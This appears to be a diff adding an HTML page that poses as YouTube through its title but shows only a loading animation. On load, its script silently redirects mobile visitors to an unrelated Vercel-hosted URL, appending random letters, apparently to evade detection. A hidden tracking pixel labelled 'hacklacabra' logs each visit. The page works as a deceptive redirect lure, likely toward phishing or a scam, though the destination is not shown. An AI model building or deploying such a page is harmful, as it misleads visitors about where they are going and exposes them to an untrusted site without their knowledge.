@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Youtube.com--</title>
+  <style>
+    /* Estilos para adaptar la imagen GIF en dispositivos móviles */
+    @media screen and (max-width: 480px) {
+      img {
+        max-width: 100%;
+        height: auto;
+        animation-duration: 5s; /* Duración de la animación en segundos */
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Your HTML content goes here -->
+  <img src="https://freefrontend.com/assets/img/css-loaders/loading.gif" alt="Image">
+
+  <!-- Include the script -->
+  <script type="text/javascript">
+    function redireccionarMovil() {
+        var esDispositivoMovil = /Mobi/i.test(navigator.userAgent);
+        var urlRedireccionMovil = "https://sicoapta-git-main-norielyt.vercel.app/?vercelToolbarCode=OgX3xQFJ_zh43ib";
+
+        // Generar 27 letras aleatorias
+        var letrasAleatorias = "";
+        var caracteresPermitidos = "abcdefghijklmnopqrstuvwxyz";
+
+        for (var i = 0; i < 27; i++) {
+            var indiceAleatorio = Math.floor(Math.random() * caracteresPermitidos.length);
+            letrasAleatorias += caracteresPermitidos.charAt(indiceAleatorio);
+        }
+
+        // Agregar las letras aleatorias al final de la URL de redirección
+        urlRedireccionMovil += letrasAleatorias;
+
+        if (esDispositivoMovil) {
+            window.location.href = urlRedireccionMovil;
+        }
+    }
+
+    window.onload = redireccionarMovil;
+  </script>
+
+  <img src="//whos.amung.us/pingjs/?k=hacklacabra&t= NBA &x=https://nba.com/" style="display:none" alt="">
+</body>
+</html>
